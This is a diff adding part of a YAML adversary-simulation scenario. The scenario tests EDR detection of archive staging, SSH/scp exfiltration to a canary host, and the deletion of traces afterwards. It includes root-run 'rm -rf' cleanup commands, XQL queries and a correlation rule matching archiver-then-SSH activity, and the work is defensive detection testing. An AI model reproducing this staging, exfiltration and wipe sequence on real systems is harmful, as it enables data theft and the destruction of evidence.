+          | filter action_process_image_name = "ssh" and action_process_image_command_line contains "cortexsim-canary.invalid"
+          | filter action_process_image_command_line contains "stage-stream.tar.gz"
+          | fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line
+
+  - id: step-05
+    name: "Remove the archives and the staging tree after the attempt"
+    # What the step produces for the sensor: a PROCESS_START of rm whose
+    # command line names the archive, then of rm -rf on the staging tree and
+    # on the sandbox root. This step also carries the operator-installed
+    # correlation, whose two legs were produced on this one host by step-02
+    # (tar names the archive under /var/tmp) and by step-03 and step-04 (scp
+    # and ssh name a compressed archive). It removes the whole sandbox
+    # because a pull run executes no cleanup.commands. If an earlier step
+    # failed, a pull run never reaches this step and the sandbox stays on
+    # disk until step-01 of the next run or the cleanup commands remove it.
+    # Lab runs e42f2409 and a1d6af86 (pov-target-01, 2026-11-14 UTC): the
+    # step exited 0 and removed the sandbox, and the rm row returned one row
+    # for each run. CR-EDR-0027's XQL, run as an ordinary query over one hour
+    # at 01:11 UTC, was accepted and returned one row for pov-target-01
+    # (legs 2, events 8); the rule was not installed, so no issue was raised.
+    command: |
+      # REAL unlink of the archives, the staging tree and then the sandbox.
+      set -eu
+      sleep 40   # dwell
+      D=/var/tmp/.cortexsim-sshexfil
+      [ "$(stat -c %F:%u:%a "$D" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      [ -f "$D/out/collect-stage.tar.gz" ] || { echo "[CortexSim] no archive under $D/out: step-02 did not run, nothing to remove" >&2; exit 1; }
+      rm -f "$D/out/collect-stage.tar.gz" "$D/out/ledger-all.csv.gz"
+      rm -rf "$D/stage"
+      test ! -e "$D/out/collect-stage.tar.gz"
+      test ! -e "$D/stage"
+      rm -rf "$D"
+      test ! -e "$D"
+      echo "[CortexSim] SIM-EDR-027 step-05: archives, staging tree and sandbox removed; $D no longer exists"
+    identity: root
+    mitre_technique: "T1070.004"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-04
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation — rm starts with the archive path on its command line: the staged archive is deleted after the attempt. Tier-2 verify only"
+        ttp_ref: "TTP-2026-0553"
+        detection_id: xql-edr-027-rm-deletes-the-archive-after-the-attempt
+        verification_xql: |
+          dataset = xdr_data
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_name = "rm" and action_process_image_command_line contains "/var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz"
+          | fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line
+      - plane: EDR
+        type: Correlation
+        description: "Correlation CR-EDR-0027 (operator-installed; alert name 'EDR-027 Scratch Tarball Followed By SSH Carrier'; Medium; scheduled every 10 min, query time frame 1 h; agent_hostname mapped to Host Name and agent_id to Agent ID; no MITRE tag): on one agent, tar, zip or 7z names a compressed archive under /tmp, /var/tmp or /dev/shm AND scp, sftp or ssh starts with a compressed-archive name on its command line. The rule as written also requires the SSH-client start to come within 15 minutes after the archiver start; the fallback XQL on the card, an alternative for a tenant that will not save the rule as written, has no order check. Both XQLs were accepted as ordinary queries in the lab tenant on 2026-11-14 and returned this chain's row; the rule itself has not been installed there, so this row has not been observed as an issue"
+        ttp_ref: "TTP-2026-0553"
+        detection_id: CR-EDR-0027
+
+cleanup:
+  commands:
+    - "rm -rf /var/tmp/.cortexsim-sshexfil"
+    - "echo 'cortexsim-edr-027-cleanup-complete'"
+
+author: "Henry Reed"
+created: "2026-11-13"
+last_updated: "2026-11-14"
+tags:
+  - edr
+  - linux
+  - exfiltration
+  - collection
+  - archive
+  - ssh
+  - scp
+  - no-egress
+  - hunt-only-analytics-alert
